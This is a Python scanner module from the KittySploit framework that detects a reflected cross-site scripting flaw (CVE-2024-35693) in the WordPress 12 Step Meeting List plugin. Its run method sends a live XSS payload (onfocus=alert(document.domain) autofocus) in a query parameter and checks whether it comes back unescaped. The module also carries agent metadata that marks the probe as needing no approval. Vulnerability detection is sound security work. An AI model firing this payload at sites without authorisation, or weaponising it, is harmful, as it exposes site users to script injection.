#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Code for Recovery 12 Step Meeting List versions up to 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress 12 Step Meeting List Plugin <= 3.14.33 - Cross-Site Scripting Detection',
        'description': "Code for Recovery 12 Step Meeting List versions up to 3.14.33 contain a reflected cross-site scripting caused by improper input neutralization during web page generation, letting attackers execute malicious scripts in users' browsers, exploit requires attacker to craft a malicious URL.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wp', 'wordpress', 'wp-plugin', 'xss', 'reflected', '12-step-meeting-list', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://patchstack.com/database/vulnerability/12-step-meeting-list/wordpress-12-step-meeting-list-plugin-3-14-33-cross-site-scripting-xss-vulnerability',
            'https://github.com/code4recovery/12-step-meeting-list/issues/1415',
            'https://wordpress.org/plugins/12-step-meeting-list',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-35693',
        ],
        'cve': 'CVE-2024-35693',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?post_type=tsml_meeting&tsml-query=%22%20onfocus%3Dalert%28document.domain%29%20autofocus%20%22', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('value="" onfocus=alert(document.domain) autofocus', 'tsml',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress 12 Step Meeting List Plugin <= 3.14.33 - Cross-Site Scripting detected",
                path='/?post_type=tsml_meeting&tsml-query=%22%20onfocus%3Dalert%28document.domain%29%20autofocus%20%22',
            )
            return True
        return False

